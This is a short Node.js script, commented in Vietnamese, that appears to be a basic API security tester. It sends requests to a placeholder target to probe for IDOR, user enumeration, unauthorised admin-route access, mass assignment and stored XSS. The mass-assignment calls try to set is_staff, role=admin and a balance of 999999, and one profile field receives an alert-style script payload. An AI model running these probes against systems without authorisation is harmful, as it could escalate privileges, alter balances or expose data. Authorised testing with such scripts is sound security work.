/**
 * API Vulnerability Tester — Basic
 * 
 * Kiểm tra các lỗ hổng API phổ biến:
 * - IDOR (Insecure Direct Object Reference)
 * - Privilege Escalation
 * - Information Disclosure
 * - Authentication Bypass
 * - Mass Assignment
 * 
 * Usage: node test_api_basic.js
 * Config: Thay TARGET_URL và TOKEN bên dưới
 */

// ============ CẤU HÌNH ============
const TARGET_URL = 'https://TARGET_API_DOMAIN/api';
const TOKEN = 'YOUR_JWT_TOKEN_HERE';
// ==================================

const headers = {
    'Authorization': `Bearer ${TOKEN}`,
    'Content-Type': 'application/json',
};

const results = [];

async function test(name, method, path, body = null, expectedStatus = null) {
    try {
        const opts = { method, headers, signal: AbortSignal.timeout(10000) };
        if (body) opts.body = JSON.stringify(body);
        
        const res = await fetch(`${TARGET_URL}${path}`, opts);
        const data = await res.text();
        
        let parsed;
        try { parsed = JSON.parse(data); } catch { parsed = data.substring(0, 200); }
        
        const status = expectedStatus 
            ? (res.status === expectedStatus ? '✅ EXPECTED' : '⚠️ UNEXPECTED')
            : (res.status === 200 ? '🔓 ACCESSIBLE' : `🔒 ${res.status}`);

        console.log(`${status} [${res.status}] ${name}`);
        results.push({ name, status: res.status, response: parsed });
        return { status: res.status, data: parsed };
    } catch (e) {
        console.log(`💥 ${name}: ${e.message}`);
        return null;
    }
}

async function main() {
    console.log('═'.repeat(60));
    console.log('  API VULNERABILITY TESTER');
    console.log('═'.repeat(60) + '\n');

    // ── Public Endpoints ────
    console.log('── Public Endpoints ──\n');
    await test('Health check', 'GET', '/health', null, 200);
    await test('Maintenance status', 'GET', '/maintenance', null, 200);
    await test('Public settings', 'GET', '/settings/public', null, 200);

    // ── Auth Tests ────
    console.log('\n── Auth Tests ──\n');
    await test('User enumeration', 'POST', '/auth/lookup', { identity: 'test@test.com' });
    await test('Profile', 'GET', '/user', null, 200);

    // ── IDOR Tests ────
    console.log('\n── IDOR Tests ──\n');
    const fakeId = '00000000-0000-0000-0000-000000000000';
    await test('IDOR Ticket', 'GET', `/tickets/${fakeId}`, null, 404);
    await test('IDOR Gameserver', 'GET', `/gameserver/${fakeId}`, null, 403);
    await test('IDOR VPS', 'GET', `/vps/${fakeId}`);

    // ── Admin Endpoints ────
    console.log('\n── Admin Access ──\n');
    const adminPaths = [
        '/admin/dashboard',
        '/admin/users',
        '/admin/products',
        '/admin/tickets',
        '/admin/payments/stats',
        '/admin/services',
        '/admin/system/settings',
        '/admin/employees',
    ];
    for (const p of adminPaths) {
        await test(`Admin: ${p}`, 'GET', p, null, 403);
    }

    // ── Mass Assignment ────
    console.log('\n── Mass Assignment ──\n');
    await test('Set is_staff=true', 'PUT', '/user/profile', { is_staff: true });
    await test('Set role=admin', 'PUT', '/user/profile', { role: 'admin' });
    await test('Set balance=999999', 'PUT', '/user/profile', { balance: 999999 });

    // ── Stored XSS ────
    console.log('\n── Stored XSS ──\n');
    await test('XSS in name', 'PUT', '/user/profile', { name: '<script>alert("xss")</script>' });

    // ── Results ────
    console.log('\n' + '═'.repeat(60));
    console.log(`  RESULTS: ${results.length} tests`);
    console.log('═'.repeat(60));

    const fs = require('fs');
    fs.writeFileSync('api_test_results.json', JSON.stringify(results, null, 2));
    console.log('\n[+] Results saved to api_test_results.json');
}

main().catch(console.error);
